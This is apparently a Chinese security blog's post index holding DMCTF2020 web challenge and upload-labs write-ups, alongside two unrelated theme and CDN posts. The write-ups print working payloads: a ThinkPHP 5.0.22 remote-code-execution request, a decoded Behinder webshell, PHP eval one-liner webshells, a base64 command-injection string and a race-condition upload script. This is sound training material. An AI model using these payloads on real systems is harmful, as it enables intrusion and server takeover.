die('what are you doing?'); } }else{ die(); } //level 2 if(isset($_GET['v1']) \u0026\u0026 isset($_GET['v2'])){ $v1 = $_GET['v1']; $v2 = $_GET['v2']; if($v1 != $v2 \u0026\u0026 md5($v1)==md5($v2)){ echo \"\u003cbr\u003e level 2 Ok \u003cbr\u003e\"; }else{ die('Are you kidding me ?'); } }else{ die(); } //level 3 if (isset($_POST['message'])) { $message = json_decode($_POST['message']); if ($message-\u003ekey == $key) { echo \"\u003cbr\u003e Wow you got it !!! \u003cbr\u003e\"; echo file_get_contents('/flag'); } else { die(\"fail\"); } } else{ echo \"~~~~\"; } 第一关利用intval()函数特性：直到遇上数字或正负符号才开始做转换。所以构造num=202020020a，即可。 intval函数有个特性:”直到遇上数字或正负符号才开始做转换，再遇到非数字或字符串结束时(\\0)结束转换”,在某些应用程序里由于对intval函数这个特性认识不够,错误的使用导致绕过一些安全判断导致安全漏洞 第二关利用PHP处理哈希字符串时会把”0E”开头的哈希值解释为0，所以选择两个值在md5加密后是以0E开头即可。payload：v1=QNKCDZO\u0026v2=240610708，这篇博客中还进一步的讲解了一些md5函数的漏洞。 第三关进行$message-\u003ekey和$key进行判断，$key之前没有声明过故值为空，所以传入的message也为空即可。post中传入message= 即可。 完整payload： url: http://dmctf.vaala.cloud:28113/?num=202020020a\u0026v1=QNKCDZO\u0026v2=240610708 post: message= ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:1:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#weak_type"},{"categories":["CTF"],"content":"thinkphp看到框架首先去搜索框架的漏洞，参考了[框架漏洞]Thinkphp系列漏洞【截至2020-07-20】 这道题利用ThinkPHP5.0.22版本的漏洞可以执行远程代码。Thinkphp在实现框架中的核心类Request的method方法实现了表单请求伪装。但由于对$_POST[‘_method’]属性校验不严格，导致攻击者可以通过变量覆盖掉Request类的属性并结合框架特性实现对任意函数的调用，从而实现远程代码执行。 测试payload： url： ?s=captcha post： _method=__construct\u0026filter=system\u0026method=get\u0026server[REQUEST_METHOD]=whoami 虽然报错但是最上方输出了www-data 根据题目中的提示flag在环境变量中，所以在网上查询linux系统输出环境变量的语句： SHELL env 最终获取到flag的payload： url： ?s=captcha post： _method=__construct\u0026filter=system\u0026method=get\u0026server[REQUEST_METHOD]=env 在输出末尾即是flag。 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:2:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#thinkphp"},{"categories":["CTF"],"content":"fungame打开是个游戏当然要玩一玩了在线地址：https://justdui.github.io/。 我先下了源码到本地康一康，查看源码在game.js中第122行中： JAVASCRIPT nextLevel = (nextLevel+1)%11; nextlevel根据变量名猜想是下一关的值，直接一个一个试，发现第10关入场动画不同，而且又一个大波斯，感觉就是最后一关，再将代码： JAVASCRIPT class PlayerData { // track player data between levels (when player is destroyed) constructor() { this.health = 3; this.healthMax = 3; this.boomerangs = 1; this.bigBoomerangs = 0; this.coins = 0; } } 人物属性值中的health、healthMax、bigBoomerangs数量修改为9999，三个对应的属性值分别为：生命值、生命上限、大型飞镖。当然修改以后代码不会直接生效，需要随便进一关自杀游戏reload一下。 击杀第10关波斯出现flag，但是界面过小无法完整显示，按下Ctrl+滚轮调整浏览器缩放比例，获得flag。这题其实第一次做出来的时候不是这个方法，但是写题解的时候是在复现不出来了0.0 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:3:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#fungame"},{"categories":["CTF"],"content":"bingxie首先根据提示：你需要一些特殊软件，再看题目联想到Behinder，首先下载工具。 分析题目： 源码： PHP \u003c?php error_reporting(0); highlight_file(__FILE__); function filter($file) //hint in bingxie.php { $file = strtolower($file); $file = str_replace('php', \"\", $file); $file = str_replace('data', \"???\", $file); $file = str_replace('http', \"???\", $file); $file = str_replace('file', \"???\", $file); $file = str_replace('input', \"???\", $file); $file = str_replace('filter', \"\", $file); $file = str_replace('log',\"???\",$file); return $file; } $file = $_GET['file']; $md5 =substr(md5($_GET['md5']),0,6); $file = filter($file); if ($md5=='e95100') { include $file; } ?\u003e 代码16、17行使用GET方法获得file和md5参数，file经过filter函数过滤一些PHP协议，md5参数进行md5加密并截取前6位，判断是否为e95100，如果判定成功include包含file变量指定的文件。 首先计算什么数进行md5加密后前六位是e95100。参考了Getting MD5 with certain character pattern中的回答，使用脚本： PYTHON import hashlib target = 'e95100' candidate = 0 while True: plaintext = str(candidate) hash = hashlib.md5(plaintext.encode('ascii')).hexdigest() if hash[:6] == target: print('plaintext:\"' + plaintext + '\", md5:' + hash) break candidate = candidate + 1 运行之后很快得出md5加密后前六位是e95100的数字是6666。 再根据提示hint in bingxie.php，直接访问/bingxie.php只得到一句输出：**no ,you are not a real hacker !!!**说的确实没错，想到使用php协议读取文件内容，因为str_replace函数只进行一次替换，所以在合适的位置进行双写即可绕过。构造payload： CODE http://网址?md5=6666\u0026file=pphphp://fifilterlter/convert.base64-encode/resource=bingxie.pphphp 得到base64加密的文件，扔到CyberChef里面解码（附上CyberChef的github项目地址）： CODE PD9waHANCkBlcnJvcl9yZXBvcnRpbmcoMCk7DQpzZXNzaW9uX3N0YXJ0KCk7DQovL+WmguaenOaOpeaUtuWIsHBhc3Plj4LmlbDvvIzliJnkvJrnlJ/miJAxNuS9jeeahOmaj+acuuenmOmSpe+8jOWtmOWCqOWIsHNlc3Npb27kuK0NCiRhID0gJF9HRVRbJ2EnXTsNCiRiID0gJF9HRVRbJ2InXTsNCmlmKCRhIT0kYiYmbWQ1KCRhKT09bWQ1KCRiKSkNCnsNCiAgICBlY2hvICJ5b3UgYXJlIHJpZ2h0IjsNCn0NCmVsc2V7DQogICAgZGllKCJubyAseW91IGFyZSBub3QgYSByZWFsIGhhY2tlciAhISEiKTsNCn0NCg0KaWYgKGlzc2V0KCRfR0VUWydzZWNyZXQnXSkpDQp7DQogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7DQogICAgJF9TRVNTSU9OWydrJ109JGtleTsNCiAgICBwcmludCAka2V5Ow0KfQ0KDQplbHNlDQp7DQogICAgJGtleT0kX1NFU1NJT05bJ2snXTsNCg0KICAgICRwb3N0PWZpbGVfZ2V0X2NvbnRlbnRzKCJwaHA6Ly9pbnB1dCIpOw0KDQogICAgaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICB7DQogICAgICAgICR0PSJiYXNlNjRfIi4iZGVjb2RlIjsNCiAgICAgICAgJHBvc3Q9JHQoJHBvc3QuIiIpOw0KICAgICAgICANCiAgICAgICAgZm9yKCRpPTA7JGk8c3RybGVuKCRwb3N0KTskaSsrKSB7DQogICAgICAgICAgICAgICAgICRwb3N0WyRpXSA9ICRwb3N0WyRpXV4ka2V5WyRpKzEmMTVdOw0KICAgICAgICAgICAgICAgIH0NCiAgICB9DQoNCiAgICBlbHNlDQogICAgew0KICAgICAgICAkcG9zdD1vcGVuc3NsX2RlY3J5cHQoJHBvc3QsICJBRVMxMjgiLCAka2V5KTsNCiAgICB9DQoNCiAgICAkYXJyPWV4cGxvZGUoJ3wnLCRwb3N0KTsNCiAgICAkZnVuYz0kYXJyWzBdOw0KICAgICRwYXJhbXM9JGFyclsxXTsNCiAgICBjbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319DQoNCiAgICBAbmV3IEMoJHBhcmFtcyk7DQp9DQo/Pg== 解码后得到一个php文件： PHP \u003c?php @error_reporting(0); session_start(); //如果接收到pass参数，则会生成16位的随机秘钥，存储到session中 $a = $_GET['a']; $b = $_GET['b']; if($a!=$b\u0026\u0026md5($a)==md5($b)) { echo \"you are right\"; } else{ die(\"no ,you are not a real hacker !!!\"); } if (isset($_GET['secret'])) { $key=substr(md5(uniqid(rand())),16); $_SESSION['k']=$key; print $key; } else { $key=$_SESSION['k']; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __construct($p) {eval($p.\"\");}} @new C($params); } ?\u003e 后半部分根据Behinder的官方文档和博客渗透测试-流量加密之冰蝎\u0026蚁剑的讲解，认为这个文件是个冰蝎马，参考博客中对加密通信流程进行了讲解，链接的密码为第15行$_GET['secret']中的secret。但是php文件前半部分（代码第5-13行）还需绕过，看到md5函数可以利用上一题weak_type中提到的不同字符串加密后md5相同绕过。最后payload： CODE http://网址/bingxie.php?a=QNKCDZO\u0026b=240610708 使用Behinder连接。可以在根目录下找到flag。 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:4:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#bingxie"},{"categories":["CTF"],"content":"filerce先看提示：看看log里面存的什么（利用伪协议包含），以下是访问后页面： PHP \u003c?php error_reporting(0); show_source(__FILE__); $sandbox = '/var/www/html/sandbox/'.md5(\"DMCTF\".$_SERVER['REMOTE_ADDR']); mkdir($sandbox,0777,true); chdir($sandbox); if (isset($_GET['file'])) { if (strpos($_GET[\"file\"], \"base64-decode\")) { include $_GET[\"file\"]; } else { echo \"Hacker!!!\"; } } else{ echo \"get me a file\"; } file_put_contents(\"thx.log\", base64_encode('http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']))); echo \"\u003cbr/\u003e\"; echo \"You've been recorded in $sandbox/thx.log!!!!\" ?\u003e get me a file You've been recorded in /var/www/html/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log!!!! 使用文件包含查看thx.log有什么，请求访问： CODE http://网址?file=php://filter/convert.base64-decode/resource=thx.log 输出了thx.log文件内容：http://dmctf.vaala.cloud:28236/favicon.ico，访问以后发现还是刚进来的页面。分析17行以下的代码，会打开thx.log文件，在里面写入的内容是http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']，也就是我们请求题目页面的url地址，并且多次请求以后发现log中内容成了http://网址?file=php://filter/convert.base64-decode/resource=thx.log。判断为竞争写入导致（因为之前做过竞争上传题目），所以在构造url中写入一句话木马： CODE http://网址?file=php://filter/\u003c?php @eval($_POST['a']);?\u003econvert.base64-decode/resource=thx.log 使用python脚本不断写入： PYTHON #coding=utf-8 import requests import sys def CompeteUpload(): #上传页面 geturl=\"http://dmctf.vaala.cloud:28426/?file=php://filter/\u003c?php @eval($_POST['a']);?\u003econvert.base64-decode/resource=thx.log\" #访问上传文件 r1=requests.get(url=geturl) if __name__==\"__main__\": i=10; while (i\u003e0): i-=1; CompeteUpload(); 尝试访问http://网址/sandbox/7e8c62b0ef1fa8de7542dd2272a4d021/thx.log，会下载log文件，使用base64解码以后发现一句话木马存在，直接蚁剑连接： CODE http://网址?file=php://filter/convert.base64-decode/resource=thx.log 同样在根目录下找到flag。 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:5:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#filerce"},{"categories":["CTF"],"content":"do_you_have_a_right_tokenF12查看网页代码，发现注释中一大段php代码估计就是题目用到的： PHP \u003c?php session_start(); include 'flag.php'; date_default_timezone_set('Asia/Shanghai'); if(isset($_POST['token']) \u0026\u0026 isset($_SESSION['token']) \u0026\u0026!empty($_POST['token'])\u0026\u0026!empty($_SESSION['token'])){ if($_POST['token']==$_SESSION['token']){ echo \"PassResetSuccess! Your Flag is:\".$flag; }else{ echo \"Token_error!\"; } }else{ mt_srand(time()); $rand= mt_rand(); $_SESSION['token']=sha1(md5($rand)); echo \"Token Generate Ok!\"; } echo '\u003cform action=\"\" method=\"POST\"\u003e \u003cinput type=\"text\" name=\"token\"\u003e \u003cinput type=\"submit\" value=\"submit\"\u003e \u003c/form\u003e'; echo \"\u003c!--\\r\\n\".file_get_contents(__FILE__); ?\u003e 分析一波：判断post请求中的token，如果不为空则与$_SESSION['token']判断是否相等，相等输出flag，再往下看12-16行，如果为空的话使用当前时间作为随机数的种子，生成一个随机数并进行md5和sha1函数加密并存入$_SESSION[‘token’]。 所以思路就是：我们需要知道生成的那个随机数的值，在网上搜到参考php伪随机数，可以根据种子预测随机数。题目使用： CODE mt_srand(time()); 根据第4行设置时区时间并设置随机数种子，所以在本地环境使用相同方法尝试预测随机数，但是还需考虑到本地时间和题目服务器时间不同步问题，我想到的方法是借用之前题目获得的webshell上传php文件对本地时间进行校正： PHP \u003c?php date_default_timezone_set('Asia/Shanghai'); echo time(); ?\u003e 计算时间差为69，所以修改代码跑一遍： PHP \u003c?php date_default_timezone_set('Asia/Shanghai'); // echo time()-69; 这是我验证时间用的 mt_srand(time()-69); $rand = mt_rand(); echo sha1(md5($rand)); ?\u003e 提交本地运行后得到的密文提交上去就可以获得flag。 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:6:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#do_you_have_a_right_token"},{"categories":["CTF"],"content":"pingpingping进入以后是一个类似终端的界面，随便输几个指令提示：输入help获得提示，help以后又提示只能使用test和login，进入test以后提示输入url地址，所以这个才是符合题目的pingpingping，可以使用通道符|连接执行其他命令，搜索到了疑似本题的博客GXYCTF–PingPingPing，猜测flag很有可能还在根目录下，所以可以执行cat /flag输出，模仿博客中的构造方式把payload进行base64编码，使用sh执行命令，最终payload： CODE 127.0.0.1|echo$IFS$1Y2F0IC9mbGFn|base64$IFS$1-d|sh 获得flag ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:7:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#pingpingping"},{"categories":["CTF"],"content":"p3’webshell提示给了一个链接：一些不包含数字和字母的webshell，看了以后确实受益匪浅收获很多，但是对于这个题目来说是一个烟雾弹。（更正，是我没看后面题，后面题用到了这个提示，这篇文章会继续更新。） 源码： CODE \u003c?php $command=$_POST['command']; highlight_file(__FILE__); if(!preg_match('/\\'|{|\\(|\\)|}|\\$|_|=|1|\\+|;|\\./i', $command)){ die(\"\u003cscript\u003ealert('?')\u003c/script\u003e\"); } eval($command); ?\u003e 第4行使用正则表达式匹配$command字符串，但是前面有一个!取反，所以只要payload匹配到正则表达式即可绕过。post中请求： CODE command=fputs(fopen('shell.php','w'),'\u003c?php @eval($_POST['a']);?\u003e'); 使用蚁剑连接http://网址/shell.php，在根目录里找到flag。 ","date":"2020-11-29","objectID":"/posts/dmctf%E4%B9%8Bweb/:8:0","series":null,"tags":["web","DMCTF2020","RCE"],"title":"DMCTF之Web","uri":"/posts/dmctf%E4%B9%8Bweb/#p3webshell"},{"categories":["瞎折腾"],"content":"前言​ 上一篇修改了黑幕，但是使用了jsdelivr加速的静态资源，所以照常更新下github上的资源，但是github上查看已经上传成功了，jsdelivr访问的依然是之前的资源，说白了就是缓存的问题。即使本地浏览器端的缓存已经清理，也会因为CDN周围的节点没有同步数据而导致用户端未能及时更新。 ","date":"2020-11-20","objectID":"/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/:1:0","series":null,"tags":["jsdelivr"],"title":"jsdelivr 缓存刷新","uri":"/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/#前言"},{"categories":["瞎折腾"],"content":"缓存刷新把原来访问的链接 https://cdn.jsdelivr.net/... 改为 https://purge.jsdelivr.net/... 访问资源就会进行刷新，然后页面会返回刷新信息： 划水收工。 ","date":"2020-11-20","objectID":"/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/:2:0","series":null,"tags":["jsdelivr"],"title":"jsdelivr 缓存刷新","uri":"/posts/jsdelivr-%E7%BC%93%E5%AD%98%E5%88%B7%E6%96%B0/#缓存刷新"},{"categories":["瞎折腾"],"content":"前言​ 老早就觉得萌娘百科里的黑幕很好玩，所以摸索着给自己博客加了一个。参考博客Re：萌娘百科上的黑幕实现。不过我改的方法有稍稍有点不同，是把hexo渲染markdown文章中的删除线~~ ~~标签修改了。我回来又想到了更好的方法，markdown支持文章中的自定义标签，自己增加一个\u003cspan class='heimu'\u003e...\u003c/span\u003e标签更好。那么两种都记一下吧。当然用自定义标签的话还可以保留删除线。 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:1:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#前言"},{"categories":["瞎折腾"],"content":"示例我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气我刚刚去楼下售卖机买饮料发现没有用上优惠券，就很气原博客图 萌娘百科官方介绍 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:2:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#示例"},{"categories":["瞎折腾"],"content":"准备工作​ 先进入主题的资源文件夹themes\\butterfly\\source\\，修改需要用到的文件css\\_global\\index.styl、js/main.js。 ​ 说明一下两个文件的作用：主题的总样式表index.css是经过整合形成的，而**.styl文件是基于Node.js的CSS的预处理框架**，我们会在这个里面添加黑幕的样式。main.js里面使用选择器为标签添加title='你知道的太多了'，这个可以修改成自己喜欢的。 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:3:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#准备工作"},{"categories":["瞎折腾"],"content":"修改自定义标签 在index.styl文件末尾添加 .heimu, .heimu a, a .heimu, .heimu a.new, .heimu code background-color: #252525 !important color: #252525 !important text-shadow: none .heimu:hover, .heimu:active, .heimu:hover .heimu, .heimu:active .heimu,.heimu code:hover color: white !important; .heimu:hover a, a:hover .heimu, .heimu:active a, a:active .heimu color: lightblue !important; .heimu:hover .new, .heimu .new:hover, .new:hover .heimu, .heimu:active .new, .heimu .new:active, .new:active .heimu color: #BA0000 !important; 因为是.styl的文件，缩进是很严格的，自行按照前面缩进来整理一下。上面那么多就是兼容了一下黑幕下的超链接、粗体、代码块。主要是超链接。 在main.js的unRefreshFn和refreshFn方法之前定义addheimuTitle函数 //你知道的太多了 const addheimuTitle = function(){ console.log(123) $('.heimu').attr('title','你知道的太多了') } 可以ctrl+f搜索上面那两个..refreshFn函数，发现是整个JS中函数调用的入口，所以我们也需要把自己定义的addheimuTitle函数在这里面调用。我盲猜的嗷refreshFn这个函数是在载入页面会调用，直接在里面第二行加上 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:4:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#修改自定义标签"},{"categories":["瞎折腾"],"content":"修改删除线​ 修改css\\_layout\\post.styl文件，在文件中找到id为#article-container的元素，这个元素是文章页面中最外层的元素，我们需要在它里面添加 #article-container ..... ..... del background-color: #252525; color: #252525; text-shadow: none; text-decoration: none \u0026:hover color: white !important; ​ 因为文章中的删除线被渲染以后页面的标签为\u003cdel\u003e，选中id为article-container下的所有del标签添加样式，剩下的还有在main.js中添加title和上面的方法差不多，只需要把选择器修改为$('#article-container del').attr('title','你知道的太多了')。 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:5:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#修改删除线"},{"categories":["瞎折腾"],"content":"完工​ 两种方法比较下，第一种方法可以保留删除线，但是在写文章时需要再手打一遍标签，第二种方法直接借用删除线，能省事但是删除线就用不了了。我用的第一种。 ","date":"2020-11-20","objectID":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/:6:0","series":null,"tags":["黑幕实现"],"title":"萌娘百科黑幕实现","uri":"/posts/%E8%90%8C%E5%A8%98%E7%99%BE%E7%A7%91%E9%BB%91%E5%B9%95%E5%AE%9E%E7%8E%B0/#完工"},{"categories":["DROPS"],"content":"Pass-17​ （windows环境，php版本5.2.17，题号是18题） 源码： $is_upload = false; $msg = null; if(isset($_POST['submit'])){ $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); } }else{ $msg = '上传出错！'; } } ​ 思路和前面的一样，获取文件信息，移动文件到upload文件夹，第12行使用了白名单验证，多了第14行的rename函数，看名称就是重命名的函数，所以我们可以在重命名之前访问我们上传的文件，所以这题用到了上传竞争，使用python脚本不断的向服务器上传文件，然后访问上传的文件，上传的文件中有一句代码\u003c?php fputs(fopen('shell.php','w'),'\u003c?php phpinfo();?\u003e');?\u003e这段代码执行以后，会创建一个名为shell.php里面有一句\u003c?php phpinfo();?\u003e的文件。 ​ 脚本代码 #coding=utf-8 import requests from multiprocessing import Pool def CompeteUpload(list): url=\"http://upload-labs/Pass-18/index.php\" #上传页面 geturl=\"http://upload-labs/upload/233.php\" #访问上传文件 file={'upload_file':('233.php',\"\u003c?php fputs(fopen('shell.php','w'),'\u003c?php phpinfo();?\u003e');?\u003e\",'image/jpeg')} data={'submit':'上传'} r=requests.post(url=url,data=data,files=file) #print \"test upload....\" r1=requests.get(url=geturl) if r1.status_code==200: print (\"upload success!\") if __name__==\"__main__\": pool = Pool(10) pool.map(CompeteUpload, range(10000)) pool.close() pool.join() ​ 第一次用python的我在这里知道了pip。这道题因为要不断的上传和访问文件，所以对在线靶场不友好，所以才选择了本地环境解题。完工 ","date":"2020-11-19","objectID":"/posts/upload-labs5/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/upload-labs5/#pass-17"},{"categories":["DROPS"],"content":"Pass-18（失手）​ 18题失手了没有思路，如果使用include.php文件包含的话还可以，看了看网上大部分的博客都是敷敷衍衍过去的，找到了一篇稍微有点思路的，使用的是apache2.2.x的解析漏洞，这个漏洞的思路就是，apache服务器在解析有多个后缀名的文件时，从最后一个开始向前扫描，如果不认识就跳过，直到遇到一个认识的文件后缀，就把这个文件以这个能识别的后缀解析。 Apache文件解析漏洞 apache httpd多后缀解析漏洞复现 ​ 源码中还有一个可以突破的点是同样使用了重命名函数，所以应该还是可以使用竞争上传访问得到，但是使用了白名单验证，我实在是没招了所以先摸为敬。 ","date":"2020-11-19","objectID":"/posts/upload-labs5/:2:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/upload-labs5/#pass-18失手"},{"categories":["DROPS"],"content":"Pass-19（windows环境，php5.2.17，magic_quotes_gpc=Off） 源码： $is_upload = false; $msg = null; if (isset($_POST['submit'])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $is_upload = true; }else{ $msg = '上传出错！'; } }else{ $msg = '禁止保存为该类型文件！'; } } else { $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; } } ​ 源码第七行使用了POST来接受文件的命名，前面有类似题的是使用了0x00截断上传，后面也同样是move_uploaded_file移动文件的函数，还使用了黑名单验证，方法就很明确，使用截断上传。别忘了截断上传需要的特定条件：php版本需要低于5.3.29、magic_quotes_gpc需要为关闭状态。 ​ 同样是命名为phpa方便在十六进制表里修改为00 ​ 打开图片把url链接http://upload-labs/upload/upload-19.php�修改一下即可。完工 ​ 其实这道题还有一个思路，因为题目使用了黑名单验证，分析源码没有设置大小写过滤，所以也可以使用大小写方法通过如Php，不演示了。 ","date":"2020-11-19","objectID":"/posts/upload-labs5/:3:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/upload-labs5/#pass-19"},{"categories":["DROPS"],"content":"Pass-20（LInux环境，php7.2.21） 源码： $is_upload = false; $msg = null; if(!empty($_FILES['upload_file'])){ //检查MIME $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type)){ $msg = \"禁止上传该类型文件!\"; }else{ //检查文件名 $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) { $file = explode('.', strtolower($file)); } $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) { $msg = \"禁止上传该后缀文件!\"; }else{ $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) { $msg = \"文件上传成功！\"; $is_upload = true; } else { $msg = \"文件上传失败！\"; } } } }else{ $msg = \"请选择要上传的文件！\"; } ​ 这道题使用了MIME验证和白名单验证。先看第10行使用了三目运算符判断$_POST['save_name']是否为空，若为空则执行:前获取上传文件的名称，若不为空则获取POST中的save_name。第11行使用了is_array函数判断是否是一个数组，然后使用explode截断文件名转换小写并返回数组。也就是说，如果我们POST中的save_name是个数组的就可以跳过11行的判断。15行使用end函数获取数组中的最后一个元素用于后缀验证。20行把文件名进行拼接：数组第一个元素+数组元素总数-1的那个元素。 所以我们可以构造一个这样的数组用于绕过： ​ 数组[2]用于绕过白名单，文件名为：数组[0].数组[1]，但是数组[1]是空的所以只剩下数组[0].（后面有个点） ​ 别忘了还要绕过MIME 完工 ","date":"2020-11-19","objectID":"/posts/upload-labs5/:4:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/upload-labs5/#pass-20"},{"categories":["DROPS"],"content":"最后​ Upload labs的20道题大部分完成了，有两道题没完成，但是也学到了不少东西，这些天再抽空写一个总结吧。射射观看。 ","date":"2020-11-19","objectID":"/posts/upload-labs5/:5:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs的最后几道题","uri":"/posts/upload-labs5/#最后"},{"categories":["DROPS"],"content":"前言​ 我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。 ​ 参考博客：upload-labs之pass 16详细分析 ","date":"2020-11-16","objectID":"/posts/upload-labs4/:1:0","series":null,"tags":["文件上传漏洞"],"title":"Upload-Labs之Pass-16","uri":"/posts/upload-labs4/#前言"},{"categories":["DROPS"],"content":"Pass-16​ 源码（三种图片的判定，只贴一个吧，篇幅小一点）： $is_upload = false; $msg = null; if (isset($_POST['submit'])){ // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") \u0026\u0026 ($filetype==\"image/jpeg\")){ 